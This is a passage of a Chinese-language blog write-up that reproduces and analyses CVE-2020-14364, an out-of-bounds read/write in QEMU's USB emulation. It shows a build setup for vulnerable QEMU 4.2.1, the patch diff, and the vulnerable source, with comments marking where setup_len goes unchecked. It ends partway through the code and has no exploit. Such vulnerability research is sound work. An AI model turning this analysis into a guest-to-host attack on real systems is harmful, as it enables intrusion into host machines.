<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>CVE-2020-14364 QEMU 越界读写漏洞复现&amp;分析 | LYYL' Blog</title><meta name="keywords" content="LYYL, Blog, Pwn, pwn"><meta name="author" content="LYYL"><meta name="copyright" content="LYYL"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="环境搭建创建usb设备 12qemu-img create -f raw usb.img 32Mmkfs.vfat usb.img  编译qemu 1234567git clone git:&#x2F;&#x2F;git.qemu-project.org&#x2F;qemu.gitcd qemugit checkout tags&#x2F;v4.2.1mkdir -p bin&#x2F;debug&#x2F;naivecd bin&#x2F;debug&#x2F;naive.">
<meta property="og:type" content="article">
<meta property="og:title" content="CVE-2020-14364 QEMU 越界读写漏洞复现&amp;分析">
<meta property="og:url" content="https://www.lyyl.online/posts/3399981355.html">
<meta property="og:site_name" content="LYYL&#39; Blog">
<meta property="og:description" content="环境搭建创建usb设备 12qemu-img create -f raw usb.img 32Mmkfs.vfat usb.img  编译qemu 1234567git clone git:&#x2F;&#x2F;git.qemu-project.org&#x2F;qemu.gitcd qemugit checkout tags&#x2F;v4.2.1mkdir -p bin&#x2F;debug&#x2F;naivecd bin&#x2F;debug&#x2F;naive.">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/bg/bg-76.jpeg">
<meta property="article:published_time" content="2021-02-19T01:32:34.000Z">
<meta property="article:modified_time" content="2022-05-26T07:56:59.326Z">
<meta property="article:author" content="LYYL">
<meta property="article:tag" content="LYYL, Blog, Pwn, pwn">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/bg/bg-76.jpeg"><link rel="shortcut icon" href="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/favicon.png"><link rel="canonical" href="https://www.lyyl.online/posts/3399981355"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//www.google-analytics.com" crossorigin=""/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script async="async" src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script><script>(adsbygoogle = window.adsbygoogle || []).push({
  google_ad_client: 'ca-pub-8740935439028405',
  enable_page_level_ads: 'true'
});</script><script async="async" src="https://www.googletagmanager.com/gtag/js?id=G-MBZHBXMDJ2"></script><script>window.dataLayer = window.dataLayer || [];
function gtag(){dataLayer.push(arguments);}
gtag('js', new Date());
gtag('config', 'G-MBZHBXMDJ2');
</script><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":200},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
    },
    fancybox: {
      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'CVE-2020-14364 QEMU 越界读写漏洞复现&分析',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2022-05-26 15:56:59'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.2.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/favicon.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">27</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/bg/bg-76.jpeg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">LYYL' Blog</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">CVE-2020-14364 QEMU 越界读写漏洞复现&amp;分析</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="fa-fw post-meta-icon far fa-calendar-alt"></i><span class="post-meta-label">发表于</span><time datetime="2021-02-19T01:32:34.000Z" title="undefined 2021-02-19 09:32:34">2021-02-19</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">15k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>74分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="CVE-2020-14364 QEMU 越界读写漏洞复现&amp;分析"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>创建<code>usb</code>设备</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">qemu-img create -f raw usb.img 32M</span><br><span class="line">mkfs.vfat usb.img</span><br></pre></td></tr></table></figure>

<p>编译<code>qemu</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> git://git.qemu-project.org/qemu.git</span><br><span class="line"><span class="built_in">cd</span> qemu</span><br><span class="line">git checkout tags/v4.2.1</span><br><span class="line"><span class="built_in">mkdir</span> -p bin/debug/naive</span><br><span class="line"><span class="built_in">cd</span> bin/debug/naive</span><br><span class="line">../../../configure --target-list=x86_64-softmmu --enable-debug --disable-werror --enable-spice</span><br><span class="line">make</span><br></pre></td></tr></table></figure>

<p>编译完成的二进制文件位于<code>bin/debug/naive/x86_64-softmmu/qemu-system-x86_64</code>，启动脚本如下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -m 1G -nographic \</span><br><span class="line">    -hda ./rootfs.img \</span><br><span class="line">    -kernel ./bzImage \</span><br><span class="line">    -append <span class="string">&quot;console=ttyS0 root=/dev/sda rw&quot;</span> \</span><br><span class="line">    -device e1000,netdev=net0 \</span><br><span class="line">    -netdev user,<span class="built_in">id</span>=net0,hostfwd=tcp::2222-:22 \</span><br><span class="line">    -usb \</span><br><span class="line">    -drive <span class="keyword">if</span>=none,format=raw,<span class="built_in">id</span>=disk1,file=./CVE-2020-14364/usb.img \</span><br><span class="line">    -device ich9-usb-ehci1,<span class="built_in">id</span>=usb \ <span class="comment"># 添加的usb控制总线</span></span><br><span class="line">    -device usb-storage,drive=disk1 \</span><br></pre></td></tr></table></figure>

<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>首先看一下<code>CVE</code>中的漏洞描述</p>
<blockquote>
<p>An out-of-bounds read/write access flaw was found in the USB emulator of the QEMU in versions before 5.2.0. This issue occurs while processing USB packets from a guest when USBDevice ‘setup_len’ exceeds its ‘data_buf[4096]’ in the do_token_in, do_token_out routines. This flaw allows a guest user to crash the QEMU process, resulting in a denial of service, or the potential execution of arbitrary code with the privileges of the QEMU process on the host.</p>
</blockquote>
<p>即在函数中正在处理的<code>USB</code>数据包的<code>setup_len</code>可以超过了<code>4096</code>限制，从而造成越界的读写。看一下<a target="_blank" rel="noopener external nofollow noreferrer" href="https://git.qemu.org/?p=qemu.git;a=commit;h=b946434f2659a182afc17e155be6791ebfb302eb">patch</a></p>
<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">diff --git a/hw/usb/core.c b/hw/usb/core.c</span></span><br><span class="line"><span class="comment">index 5abd128..5234dcc 100644 (file)</span></span><br><span class="line"><span class="comment">--- a/hw/usb/core.c</span></span><br><span class="line"><span class="comment">+++ b/hw/usb/core.c</span></span><br><span class="line"><span class="meta">@@ -129,6 +129,7 @@</span> void usb_wakeup(USBEndpoint *ep, unsigned int stream)</span><br><span class="line"> static void do_token_setup(USBDevice *s, USBPacket *p)</span><br><span class="line"> &#123;</span><br><span class="line">     int request, value, index;</span><br><span class="line"><span class="addition">+    unsigned int setup_len;</span></span><br><span class="line"> </span><br><span class="line">     if (p-&gt;iov.size != 8) &#123;</span><br><span class="line">         p-&gt;status = USB_RET_STALL;</span><br><span class="line"><span class="meta">@@ -138,14 +139,15 @@</span> static void do_token_setup(USBDevice *s, USBPacket *p)</span><br><span class="line">     usb_packet_copy(p, s-&gt;setup_buf, p-&gt;iov.size);</span><br><span class="line">     s-&gt;setup_index = 0;</span><br><span class="line">     p-&gt;actual_length = 0;</span><br><span class="line"><span class="deletion">-    s-&gt;setup_len   = (s-&gt;setup_buf[7] &lt;&lt; 8) | s-&gt;setup_buf[6];</span></span><br><span class="line"><span class="deletion">-    if (s-&gt;setup_len &gt; sizeof(s-&gt;data_buf)) &#123;</span></span><br><span class="line"><span class="addition">+    setup_len = (s-&gt;setup_buf[7] &lt;&lt; 8) | s-&gt;setup_buf[6];</span></span><br><span class="line"><span class="addition">+    if (setup_len &gt; sizeof(s-&gt;data_buf)) &#123;</span></span><br><span class="line">         fprintf(stderr,</span><br><span class="line">                 &quot;usb_generic_handle_packet: ctrl buffer too small (%d &gt; %zu)\n&quot;,</span><br><span class="line"><span class="deletion">-                s-&gt;setup_len, sizeof(s-&gt;data_buf));</span></span><br><span class="line"><span class="addition">+                setup_len, sizeof(s-&gt;data_buf));</span></span><br><span class="line">         p-&gt;status = USB_RET_STALL;</span><br><span class="line">         return;</span><br><span class="line">     &#125;</span><br><span class="line"><span class="addition">+    s-&gt;setup_len = setup_len;</span></span><br><span class="line"> </span><br><span class="line">     request = (s-&gt;setup_buf[0] &lt;&lt; 8) | s-&gt;setup_buf[1];</span><br><span class="line">     value   = (s-&gt;setup_buf[3] &lt;&lt; 8) | s-&gt;setup_buf[2];</span><br><span class="line"><span class="meta">@@ -259,26 +261,28 @@</span> static void do_token_out(USBDevice *s, USBPacket *p)</span><br><span class="line"> static void do_parameter(USBDevice *s, USBPacket *p)</span><br><span class="line"> &#123;</span><br><span class="line">     int i, request, value, index;</span><br><span class="line"><span class="addition">+    unsigned int setup_len;</span></span><br><span class="line"> </span><br><span class="line">     for (i = 0; i &lt; 8; i++) &#123;</span><br><span class="line">         s-&gt;setup_buf[i] = p-&gt;parameter &gt;&gt; (i*8);</span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line">     s-&gt;setup_state = SETUP_STATE_PARAM;</span><br><span class="line"><span class="deletion">-    s-&gt;setup_len   = (s-&gt;setup_buf[7] &lt;&lt; 8) | s-&gt;setup_buf[6];</span></span><br><span class="line">     s-&gt;setup_index = 0;</span><br><span class="line"> </span><br><span class="line">     request = (s-&gt;setup_buf[0] &lt;&lt; 8) | s-&gt;setup_buf[1];</span><br><span class="line">     value   = (s-&gt;setup_buf[3] &lt;&lt; 8) | s-&gt;setup_buf[2];</span><br><span class="line">     index   = (s-&gt;setup_buf[5] &lt;&lt; 8) | s-&gt;setup_buf[4];</span><br><span class="line"> </span><br><span class="line"><span class="deletion">-    if (s-&gt;setup_len &gt; sizeof(s-&gt;data_buf)) &#123;</span></span><br><span class="line"><span class="addition">+    setup_len = (s-&gt;setup_buf[7] &lt;&lt; 8) | s-&gt;setup_buf[6];</span></span><br><span class="line"><span class="addition">+    if (setup_len &gt; sizeof(s-&gt;data_buf)) &#123;</span></span><br><span class="line">         fprintf(stderr,</span><br><span class="line">                 &quot;usb_generic_handle_packet: ctrl buffer too small (%d &gt; %zu)\n&quot;,</span><br><span class="line"><span class="deletion">-                s-&gt;setup_len, sizeof(s-&gt;data_buf));</span></span><br><span class="line"><span class="addition">+                setup_len, sizeof(s-&gt;data_buf));</span></span><br><span class="line">         p-&gt;status = USB_RET_STALL;</span><br><span class="line">         return;</span><br><span class="line">     &#125;</span><br><span class="line"><span class="addition">+    s-&gt;setup_len = setup_len;</span></span><br><span class="line"> </span><br><span class="line">     if (p-&gt;pid == USB_TOKEN_OUT) &#123;</span><br><span class="line">         usb_packet_copy(p, s-&gt;data_buf, s-&gt;setup_len);</span><br></pre></td></tr></table></figure>

<p>可以看到这里的<code>patch</code>是增加了一个临时变量用来检查<code>setup_len</code>是否符合要求，之后在进行赋值。相当于为<code>s-&gt;setup_len</code>增加了一个回滚操作。</p>
<p>看一下关键部分的数据结构和代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* definition of a USB device */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">USBDevice</span> &#123;</span></span><br><span class="line">    DeviceState qdev;</span><br><span class="line">    USBPort *port;</span><br><span class="line">    <span class="type">char</span> *port_path;</span><br><span class="line">    <span class="type">char</span> *serial;</span><br><span class="line">    <span class="type">void</span> *opaque;</span><br><span class="line">    <span class="type">uint32_t</span> flags;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Actual connected speed */</span></span><br><span class="line">    <span class="type">int</span> speed;</span><br><span class="line">    <span class="comment">/* Supported speeds, not in info because it may be variable (hostdevs) */</span></span><br><span class="line">    <span class="type">int</span> speedmask;</span><br><span class="line">    <span class="type">uint8_t</span> addr;</span><br><span class="line">    <span class="type">char</span> product_desc[<span class="number">32</span>];</span><br><span class="line">    <span class="type">int</span> auto_attach;</span><br><span class="line">    <span class="type">bool</span> attached;</span><br><span class="line"></span><br><span class="line">    <span class="type">int32_t</span> state;</span><br><span class="line">    <span class="type">uint8_t</span> setup_buf[<span class="number">8</span>];</span><br><span class="line">    <span class="type">uint8_t</span> data_buf[<span class="number">4096</span>];</span><br><span class="line">    <span class="type">int32_t</span> remote_wakeup;</span><br><span class="line">    <span class="type">int32_t</span> setup_state;</span><br><span class="line">    <span class="type">int32_t</span> setup_len;</span><br><span class="line">    <span class="type">int32_t</span> setup_index;</span><br><span class="line"></span><br><span class="line">    USBEndpoint ep_ctl;</span><br><span class="line">    USBEndpoint ep_in[USB_MAX_ENDPOINTS];</span><br><span class="line">    USBEndpoint ep_out[USB_MAX_ENDPOINTS];</span><br><span class="line"></span><br><span class="line">    QLIST_HEAD(, USBDescString) strings;</span><br><span class="line">    <span class="type">const</span> USBDesc *usb_desc; <span class="comment">/* Overrides class usb_desc if not NULL */</span></span><br><span class="line">    <span class="type">const</span> USBDescDevice *device;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> configuration;</span><br><span class="line">    <span class="type">int</span> ninterfaces;</span><br><span class="line">    <span class="type">int</span> altsetting[USB_MAX_INTERFACES];</span><br><span class="line">    <span class="type">const</span> USBDescConfig *config;</span><br><span class="line">    <span class="type">const</span> USBDescIface  *ifaces[USB_MAX_INTERFACES];</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">/* Structure used to hold information about an active USB packet.  */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">USBPacket</span> &#123;</span></span><br><span class="line">    <span class="comment">/* Data fields for use by the driver.  */</span></span><br><span class="line">    <span class="type">int</span> pid;</span><br><span class="line">    <span class="type">uint64_t</span> id;</span><br><span class="line">    USBEndpoint *ep;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> stream;</span><br><span class="line">    QEMUIOVector iov;</span><br><span class="line">    <span class="type">uint64_t</span> parameter; <span class="comment">/* control transfers */</span></span><br><span class="line">    <span class="type">bool</span> short_not_ok;</span><br><span class="line">    <span class="type">bool</span> int_req;</span><br><span class="line">    <span class="type">int</span> status; <span class="comment">/* USB_RET_* status code */</span></span><br><span class="line">    <span class="type">int</span> actual_length; <span class="comment">/* Number of bytes actually transferred */</span></span><br><span class="line">    <span class="comment">/* Internal use by the USB layer.  */</span></span><br><span class="line">    USBPacketState state;</span><br><span class="line">    USBCombinedPacket *combined;</span><br><span class="line">    QTAILQ_ENTRY(USBPacket) <span class="built_in">queue</span>;</span><br><span class="line">    QTAILQ_ENTRY(USBPacket) combined_entry;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">do_token_in</span><span class="params">(USBDevice *s, USBPacket *p)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> request, value, index;</span><br><span class="line"></span><br><span class="line">    assert(p-&gt;ep-&gt;nr == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    request = (s-&gt;setup_buf[<span class="number">0</span>] &lt;&lt; <span class="number">8</span>) | s-&gt;setup_buf[<span class="number">1</span>];</span><br><span class="line">    value   = (s-&gt;setup_buf[<span class="number">3</span>] &lt;&lt; <span class="number">8</span>) | s-&gt;setup_buf[<span class="number">2</span>];</span><br><span class="line">    index   = (s-&gt;setup_buf[<span class="number">5</span>] &lt;&lt; <span class="number">8</span>) | s-&gt;setup_buf[<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span>(s-&gt;setup_state) &#123;</span><br><span class="line">    <span class="keyword">case</span> SETUP_STATE_ACK:</span><br><span class="line">        <span class="keyword">if</span> (!(s-&gt;setup_buf[<span class="number">0</span>] &amp; USB_DIR_IN)) &#123;</span><br><span class="line">            usb_device_handle_control(s, p, request, value, index,</span><br><span class="line">                                      s-&gt;setup_len, s-&gt;data_buf);</span><br><span class="line">            <span class="keyword">if</span> (p-&gt;status == USB_RET_ASYNC) &#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            s-&gt;setup_state = SETUP_STATE_IDLE;</span><br><span class="line">            p-&gt;actual_length = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> SETUP_STATE_DATA:</span><br><span class="line">        <span class="keyword">if</span> (s-&gt;setup_buf[<span class="number">0</span>] &amp; USB_DIR_IN) &#123;</span><br><span class="line">            <span class="type">int</span> len = s-&gt;setup_len - s-&gt;setup_index;<span class="comment">// 可控</span></span><br><span class="line">            <span class="keyword">if</span> (len &gt; p-&gt;iov.size) &#123;</span><br><span class="line">                len = p-&gt;iov.size;</span><br><span class="line">            &#125;</span><br><span class="line">            usb_packet_copy(p, s-&gt;data_buf + s-&gt;setup_index, len);<span class="comment">// 越界读</span></span><br><span class="line">            s-&gt;setup_index += len;</span><br><span class="line">            <span class="keyword">if</span> (s-&gt;setup_index &gt;= s-&gt;setup_len) &#123;</span><br><span class="line">                s-&gt;setup_state = SETUP_STATE_ACK;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        s-&gt;setup_state = SETUP_STATE_IDLE;</span><br><span class="line">        p-&gt;status = USB_RET_STALL;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        p-&gt;status = USB_RET_STALL;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">do_token_out</span><span class="params">(USBDevice *s, USBPacket *p)</span></span><br><span class="line">&#123;</span><br><span class="line">    assert(p-&gt;ep-&gt;nr == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span>(s-&gt;setup_state) &#123;</span><br><span class="line">    <span class="keyword">case</span> SETUP_STATE_ACK:</span><br><span class="line">        <span class="keyword">if</span> (s-&gt;setup_buf[<span class="number">0</span>] &amp; USB_DIR_IN) &#123;</span><br><span class="line">            s-&gt;setup_state = SETUP_STATE_IDLE;</span><br><span class="line">            <span class="comment">/* transfer OK */</span></span><br><span class="line">        